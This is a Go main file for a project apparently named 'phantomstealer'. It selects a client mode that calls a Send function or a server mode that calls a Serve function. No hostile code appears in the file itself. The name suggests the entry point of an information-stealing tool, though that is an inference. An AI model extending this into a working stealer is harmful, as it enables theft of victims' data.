package main

import (
	"flag"
	"fmt"
	"phantomstealer/client"
	"phantomstealer/server"
)

func main() {
	clientFlag := flag.Bool("client", false, "Run in client mode")
	serverFlag := flag.Bool("server", false, "Run in server mode")
	flag.Parse()

	switch {
	case *clientFlag:
		client.Send()
	case *serverFlag:
		server.Serve()
	default:
		fmt.Println("Please specify -client or -server")
	}
}
